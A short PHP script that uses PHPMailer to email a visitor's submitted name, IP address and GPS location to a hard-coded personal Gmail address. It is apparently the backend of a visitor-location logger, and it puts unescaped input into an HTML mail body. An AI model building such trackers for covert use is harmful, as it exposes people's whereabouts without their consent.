<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

$name = $_POST['name'];
$ip = $_POST['ip'];
$gps = $_POST['gps'];

$mail = new PHPMailer(true);
try {
    // Server settings
    $mail->SMTPDebug = 0;
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'your-email@gmail.com';
    $mail->Password   = 'your-email-password';
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    // Recipients
    $mail->setFrom('your-email@gmail.com', 'Your Name');
    $mail->addAddress('joshcameronbruce@gmail.com');

    // Content
    $mail->isHTML(true);
    $mail->Subject = 'Viewer Information';
    $mail->Body    = "Name: $name<br>IP address: $ip<br>GPS location: $gps";

    $mail->send();
    echo 'Email sent successfully';
} catch (Exception $e) {
    echo 'Email could not be sent. Error: ' . $mail->ErrorInfo;
}
